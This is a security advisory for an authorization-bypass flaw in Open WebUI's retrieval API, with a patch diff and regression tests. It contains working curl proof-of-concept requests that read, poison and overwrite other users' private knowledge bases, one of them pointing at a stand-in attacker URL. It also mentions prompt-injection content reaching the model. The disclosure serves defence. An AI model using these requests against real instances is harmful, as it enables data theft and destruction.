# [H] Open WebUI Vulnerable to IDOR: Retrieval API Bypasses Knowledge Base Access Controls

## Summary
Severity: High
Advisory: GHSA-4g37-7p2c-38r9
CVE: CVE-2026-45398
CWE: CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-4g37-7p2c-38r9
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.5

## Details
# IDOR: Retrieval API Bypasses Knowledge Base Access Controls

**Author:** Andrew Orr <aorr@tenable.com>

## Summary

`_validate_collection_access()` ([PR #22109](https://github.com/open-webui/open-webui/pull/22109)) checks the `user-memory-*` and `file-*` collection name prefixes but does not check knowledge base collections, which use raw UUIDs as collection names. Any authenticated user who knows a private knowledge base UUID can read its content through the retrieval query endpoints, even though the knowledge API correctly denies that user access. The same gap affects the retrieval write endpoints (`/process/text`, `/process/file`, `/process/files/batch`, `/process/web`, `/process/youtube`), allowing an attacker to inject content into or overwrite another user's knowledge base.

Reproduced on `main` at commit `4d058a125` (v0.8.11) on March 26, 2026.

## Severity

- CWE-639: Authorization Bypass Through User-Controlled Key
- CVSS 3.1: `7.5 (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)` -- `AC:H` because exploitation requires knowing a target UUID; `I:H` and `A:H` because the write path allows poisoning or destruction of another user's knowledge base

## Default Configuration Reachability

Reachable in default configuration. All affected endpoints require only `get_verified_user`, not `get_admin_user`, so any non-admin account in a typical multi-user deployment can reach them. The only prerequisite beyond authentication is knowledge of a target knowledge base UUID, which is reflected in the `AC:H` score. However, KB UUIDs are stable identifiers that leak through normal usage rather than secrets (see Prerequisites below).

## Root Cause

Knowledge base embeddings are stored in vector DB collections named with the knowledge base's UUID (e.g., `550e8400-e29b-41d4-a716-446655440000`). The `_validate_collection_access` function only blocks two specific prefixes:

```python
# backend/open_webui/routers/retrieval.py lines 2330-2355
def _validate_collection_access(collection_names: list[str], user) -> None:
    if user.role == "admin":
        return

    for name in collection_names:
        if name.startswith("user-memory-") and name != f"user-memory-{user.id}":
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail=ERROR_MESSAGES.ACCESS_PROHIBITED,
            )
        elif name.startswith("file-"):
            file_id = name[len("file-"):]
            if not has_access_to_file(
                file_id=file_id,
                access_type="read",
                user=user,
            ):
                raise HTTPException(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail=ERROR_MESSAGES.ACCESS_PROHIBITED,
                )
        # No else clause -- knowledge base UUIDs pass through unchecked
```

Knowledge base UUIDs do not match either prefix, so the function returns without raising an exception. The query then executes against the vector DB with no further authorization check.

## Vulnerable Endpoints

### Read Endpoints

Both retrieval query endpoints accept a collection name and call `_validate_collection_access` as their sole authorization gate:

1. `POST /api/v1/retrieval/query/doc` (line 2367) -- single `collection_name`
2. `POST /api/v1/retrieval/query/collection` (line 2432) -- list of `collection_names`

### Write Endpoints

The following endpoints accept a `collection_name` parameter and write to the target collection without checking whether the caller owns it:

3. `POST /api/v1/retrieval/process/text` (line 1777) -- appends attacker-controlled content to the target collection
4. `POST /api/v1/retrieval/process/file` (line 1528) -- validates ownership of the uploaded file but not the destination collection
5. `POST /api/v1/retrieval/process/files/batch` (line 2578) -- same as above for multiple files
6. `POST /api/v1/retrieval/process/web` and `POST /api/v1/retrieval/process/youtube` (lines 1810-1811) -- same handler; `overwrite` defaults to `true`, so targeting an existing knowledge base deletes and replaces it

| Endpoint | Read | Write | Overwrite | Access Check |
|----------|------|-------|-----------|--------------|
| /query/doc | Yes | -- | -- | Prefix-only (bypassed) |
| /query/collection | Yes | -- | -- | Prefix-only (bypassed) |
| /process/text | -- | Yes | -- | None |
| /process/web | -- | Yes | Yes (default) | None |
| /process/youtube | -- | Yes | Yes (default) | None (same handler as /process/web) |
| /process/file | -- | Yes | -- | File only, not collection |
| /process/files/batch | -- | Yes | -- | File only, not collection |

## Proof of Concept

**Security boundary crossed:** The knowledge base access control system (ownership checks, group-based access grants) is bypassed at the retrieval layer. A non-admin user who knows a private knowledge base UUID can read it, append attacker-controlled content to it, or destroy and replace it through the retrieval API, even though the knowledge API correctly denies the same user access to the same resource.

`open-webui-idor-poc.sh` provides a self-contained Docker lab that stands up the target environment and tests every vulnerable endpoint listed above. See the comments at the top of that file for setup, usage, and configuration options.

### Prerequisites

- Attacker has an authenticated (non-pending) account on the target instance.
- A victim user has created a private knowledge base containing sensitive documents.
- Attacker knows the victim's knowledge base UUID. V4 UUIDs are not guessable, but they are stable identifiers that leak through normal platform usage:
  - **Access revocation:** A user learns a KB UUID through a shared workspace or group, loses access, and finds the retrieval API still honors the stale UUID. The knowledge API correctly revokes access at request time (`access_grants.py:549-558` dynamically queries current group memberships), but the retrieval API has no equivalent check.
  - **Model metadata:** When a model is shared with a group, `GET /api/models/list` returns the full `meta.knowledge` array -- including KB UUIDs -- to every user with access to the model, even if they have no access to the referenced knowledge bases (`models.py:58-130`).
  - **URL leakage:** KB UUIDs appear in browser URLs (`/workspace/knowledge/{id}`, `Knowledge.svelte:260`) and can leak through shared links, browser history, Referrer headers, or proxy logs.
  - **RAG citation metadata:** KB UUIDs are stored as `source.id` in chat message sources (`middleware.py:1950-1965`, `socket/main.py:880-897`). Shared chats return these sources unfiltered (`chats.py:815-830`).

### Read: Extract Private KB Content

Authenticate as the attacker:

```bash
TOKEN=$(curl -s -X POST https://open-webui/api/v1/auths/signin \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@example.com", "password": "password"}' \
  | jq -r '.token')
```

**Control request:** the knowledge API correctly blocks the attacker:

```bash
curl -s https://open-webui/api/v1/knowledge/<victim_kb_uuid> \
  -H "Authorization: Bearer $TOKEN"
```

```json
{"detail": "You do not have permission to access this resource."}
```

**Exploit request:** the retrieval API returns the same KB's content without authorization:

```bash
curl -s -X POST https://open-webui/api/v1/retrieval/query/doc \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "collection_name": "<victim_kb_uuid>",
    "query": "confidential",
    "k": 50
  }'
```

Expected result when vulnerable: the server returns matching document chunks from the victim's private knowledge base, including text content and metadata (source filenames, file IDs, hashes).

The `/query/collection` endpoint accepts a list of collection names and behaves identically:

```bash
curl -s -X POST https://open-webui/api/v1/retrieval/query/collection \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "collection_names": ["<victim_kb_uuid>"],
    "query": "confidential",
    "k": 50
  }'
```

### Write: File Injection via /process/file

The `/process/file` endpoint validates that the attacker owns the uploaded file but does not validate the target `collection_name`. The attacker uploads a file under their own account, then processes it into the victim's collection:

```bash
# Upload attacker's file
FILE_ID=$(curl -s -X POST https://open-webui/api/v1/files/ \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload.txt;type=text/plain" \
  | jq -r '.id')

# Process it into the victim's KB collection
curl -s -X POST https://open-webui/api/v1/retrieval/process/file \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"file_id\": \"$FILE_ID\",
    \"collection_name\": \"<victim_kb_uuid>\"
  }"
```

### Write: Batch File Injection via /process/files/batch

Same pattern as above but accepts multiple files in a single request:

```bash
# Get the full file object for the attacker's uploaded file
FILE_OBJ=$(curl -s https://open-webui/api/v1/files/$FILE_ID \
  -H "Authorization: Bearer $TOKEN")

# Batch-process into the victim's KB collection
curl -s -X POST https://open-webui/api/v1/retrieval/process/files/batch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"files\": [$FILE_OBJ],
    \"collection_name\": \"<victim_kb_uuid>\"
  }"
```

### Write: Text Injection via /process/text

`/process/text` appends attacker-controlled content to an existing knowledge base collection:

```bash
curl -s -X POST https://open-webui/api/v1/retrieval/process/text \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "injected.txt",
    "content": "INJECTED BY ATTACKER: attacker-controlled content",
    "collection_name": "<victim_kb_uuid>"
  }'
```

The PoC then verifies that the injected text is returned by a follow-up query against the victim collection.

### Write: YouTube Transcript Replacement via /process/youtube

`/process/youtube` uses the same handler as `/process/web` with the same `overwrite=true` default. This request replaces the victim's collection with the fetched transcript:

```bash
curl -s -X POST https://open-webui/api/v1/retrieval/process/youtube \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "collection_name": "<victim_kb_uuid>"
  }'
```

### Write: Data Destruction via /process/web

`/process/web` defaults to `overwrite=true`, which deletes the existing collection before writing. The explicit query string below makes the destructive behavior obvious:

```bash
curl -s -X POST "https://open-webui/api/v1/retrieval/process/web?overwrite=true" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://attacker.com/payload.html",
    "collection_name": "<victim_kb_uuid>"
  }'
```

## Impact

- **Confidentiality**: Any authenticated user can read private knowledge base contents belonging to other users on the instance.
- **Integrity**: Attacker-controlled content can be injected into another user's knowledge base, poisoning downstream RAG results. Injected prompt-injection payloads would be passed to the model when the victim queries the knowledge base.
- **Availability**: `/process/web` and `/process/youtube` default to `overwrite=true`, letting an attacker delete and replace a victim's entire knowledge base in a single request.

## Remediation

Two changes are needed:

1. Add a `permission` parameter to `_validate_collection_access`, use it for both `file-*` and knowledge base checks, and add a knowledge base ownership/access check for collection names that do not match the existing prefixes. `AccessGrants.has_access` already resolves group memberships internally when `user_group_ids` is omitted, matching the pattern used throughout `knowledge.py`.

2. The affected write endpoints must call `_validate_collection_access` with `permission="write"` before operating on the provided `collection_name`.

```diff
--- a/backend/open_webui/routers/retrieval.py
+++ b/backend/open_webui/routers/retrieval.py
@@ -39,4 +39,5 @@
 from open_webui.models.files import FileModel, FileUpdateForm, Files
 from open_webui.utils.access_control.files import has_access_to_file
 from open_webui.models.knowledge import Knowledges
+from open_webui.models.access_grants import AccessGrants
 from open_webui.storage.provider import Storage

@@ -2330,26 +2331,39 @@
-def _validate_collection_access(collection_names: list[str], user) -> None:
+def _validate_collection_access(collection_names: list[str], user, permission: str = "read") -> None:
     if user.role == "admin":
         return

     for name in collection_names:
         if name.startswith("user-memory-") and name != f"user-memory-{user.id}":
             raise HTTPException(
                 status_code=status.HTTP_403_FORBIDDEN,
                 detail=ERROR_MESSAGES.ACCESS_PROHIBITED,
             )
         elif name.startswith("file-"):
             file_id = name[len("file-"):]
-            if not has_access_to_file(
-                file_id=file_id,
-                access_type="read",
-                user=user,
-            ):
+            if not has_access_to_file(
+                file_id=file_id,
+                access_type=permission,
+                user=user,
+            ):
                 raise HTTPException(
                     status_code=status.HTTP_403_FORBIDDEN,
                     detail=ERROR_MESSAGES.ACCESS_PROHIBITED,
                 )
+        else:
+            knowledge = Knowledges.get_knowledge_by_id(id=name)
+            if knowledge and knowledge.user_id != user.id:
+                if not AccessGrants.has_access(
+                    user_id=user.id,
+                    resource_type="knowledge",
+                    resource_id=name,
+                    permission=permission,
+                ):
+                    raise HTTPException(
+                        status_code=status.HTTP_403_FORBIDDEN,
+                        detail=ERROR_MESSAGES.ACCESS_PROHIBITED,
+                    )
```

The existing read callers (`/query/doc`, `/query/collection`) use the default `permission="read"` and require no change. Each affected write endpoint needs a validation call after `collection_name` is resolved:

`/process/text` (line 1777):

```diff
@@ -1783,5 +1783,6 @@
     collection_name = form_data.collection_name
     if collection_name is None:
         collection_name = calculate_sha256_string(form_data.content)
+    _validate_collection_access([collection_name], user, permission="write")

     docs = [
```

`/process/web` and `/process/youtube` (lines 1810-1811, same handler):

```diff
@@ -1824,5 +1824,6 @@
             collection_name = form_data.collection_name
             if not collection_name:
                 collection_name = calculate_sha256_string(form_data.url)[:63]
+            _validate_collection_access([collection_name], user, permission="write")

             if not request.app.state.config.BYPASS_WEB_SEARCH_EMBEDDING_AND_RETRIEVAL:
```

`/process/file` (line 1528):

```diff
@@ -1548,6 +1548,7 @@
             collection_name = form_data.collection_name
             if collection_name is None:
                 collection_name = f"file-{file.id}"
+            _validate_collection_access([collection_name], user, permission="write")

             if form_data.content:
```

`/process/files/batch` (line 2578):

```diff
@@ -2593,3 +2593,4 @@
     collection_name = form_data.collection_name
+    _validate_collection_access([collection_name], user, permission="write")

     file_results: List[BatchProcessFilesResult] = []
```

## Regression Test

A regression test should verify that `_validate_collection_access` blocks non-owners from accessing knowledge base collections:

```python
from unittest.mock import MagicMock, patch

import pytest
from fastapi import HTTPException

from open_webui.routers.retrieval import _validate_collection_access


def test_validate_collection_access_blocks_non_owner_read():
    victim_kb_id = "550e8400-e29b-41d4-a716-446655440000"
    attacker = MagicMock()
    attacker.id = "attacker-user-id"
    attacker.role = "user"

    mock_knowledge = MagicMock()
    mock_knowledge.user_id = "victim-user-id"

    with patch(
        "open_webui.routers.retrieval.Knowledges.get_knowledge_by_id",
        return_value=mock_knowledge,
    ), patch(
        "open_webui.routers.retrieval.AccessGrants.has_access",
        return_value=False,
    ):
        with pytest.raises(HTTPException) as exc_info:
            _validate_collection_access([victim_kb_id], attacker)
        assert exc_info.value.status_code == 403


def test_validate_collection_access_blocks_non_owner_write():
    victim_kb_id = "550e8400-e29b-41d4-a716-446655440000"
    attacker = MagicMock()
    attacker.id = "attacker-user-id"
    attacker.role = "user"

    mock_knowledge = MagicMock()
    mock_knowledge.user_id = "victim-user-id"

    with patch(
        "open_webui.routers.retrieval.Knowledges.get_knowledge_by_id",
        return_value=mock_knowledge,
    ), patch(
        "open_webui.routers.retrieval.AccessGrants.has_access",
        return_value=False,
    ):
        with pytest.raises(HTTPException) as exc_info:
            _validate_collection_access(
                [victim_kb_id], attacker, permission="write"
            )
        assert exc_info.value.status_code == 403
```

For additional coverage, maintainers may want an integration test that creates a knowledge base as one user and confirms that a second user's retrieval query is rejected end-to-end.

## AI Disclosure

AI assistance was used to help analyze the code paths, develop the PoC workflow, and draft this report.

## Attachments

[open-webui-idor-poc.log](https://github.com/user-attachments/files/26283199/open-webui-idor-poc.log)
[open-webui-idor-poc.sh](https://github.com/user-attachments/files/26283201/open-webui-idor-poc.sh)

## Tenable's Disclosure Policy

Tenable follows a 90-day vulnerability disclosure policy. That means, even though we prefer coordinated disclosure, we'll issue an advisory on June 24, 2026 with or without a patch. Alternatively, any uncoordinated vendor release of a patch or advisory to any customers before the 90-day deadline will be considered public disclosure, and Tenable may release an advisory prior to the coordinated disclosure date. Please read the full details of our policy here: https://static.tenable.com/research/tenable-vulnerability-disclosure-policy.pdf
 
Thank you for taking the time to read this. We'd greatly appreciate it if you'd acknowledge receipt of this report. If you have any questions we'd be happy to address them.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-4g37-7p2c-38r9
- https://nvd.nist.gov/vuln/detail/CVE-2026-45398
- https://github.com/open-webui/open-webui/pull/22109
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.5
